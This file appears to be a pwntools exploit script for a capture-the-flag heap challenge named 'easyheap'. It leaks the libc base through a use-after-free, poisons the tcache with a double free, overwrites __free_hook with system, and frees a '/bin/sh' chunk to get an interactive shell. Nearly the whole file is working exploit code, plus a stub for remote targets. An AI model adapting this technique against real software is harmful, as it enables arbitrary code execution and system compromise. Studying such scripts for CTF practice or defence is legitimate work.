#coding:utf-8

from pwn import *

path = './easyheap'
debug = 1
attach = 0
#P = ELF(path)
context(os='linux',arch='amd64')
context.terminal = ['tmux','splitw','-h']
#context.log_level = 'debug'

'''
p = None
r = lambda x:p.recv(x)
rl = lambda:p.recvline
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sla = lambqda x,y:p.sendlineafter(x,y)
sa = lambda x,y:p.sendafter(x,y)
rn = lambda x:p.recvn(x)
'''

if debug == 1:
	p = process(path)
	if context.arch == 'amd64':
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	else:
		libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote()

def new(size,content):
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('size:')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.sendline(content)

def delete(index):
	p.recvuntil('>>')
	p.sendline('2')
	p.recvuntil('idx:')
	p.sendline(str(index))

def view(index):
	p.recvuntil('>>')
	p.sendline('3')
	p.recvuntil('idx:')
	p.sendline(str(index))

new(0x500,'\x00') #0
new(0x60,'\x11') #1

delete(0)
view(0)
libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fe5df606ca0-0x7fe5df422000)
log.success('libcbase = '+hex(libcbase))

new(0x60,'\x22') #2
new(0x60,'\x33') #3
new(0x60,'\x44') #4
new(0x60,'\x55') #5
new(0x60,'\x66') #6
new(0x60,'\x77') #7
new(0x60,'\x88') #8

for i in range(7):
	delete(i+1)

delete(8)
new(0x60,'\x10') #9
delete(8)

target = libcbase + libc.sym['__free_hook'] - 0x10

new(0x60,p64(target)) #10

new(0x60,'a') #11
new(0x60,'b') #12
new(0x60,'c')
new(0x60,'d')
new(0x60,'e')
new(0x60,'/bin/sh\x00') #16

if attach == 0:
	gdb.attach(p)
new(0x60,'\x00'*0x10) #17

one_gadget = [0xe237f,0xe2383,0xe2386,0x106ef8]
new(0x60,p64(libcbase+libc.sym['system']))

delete(16)

p.interactive()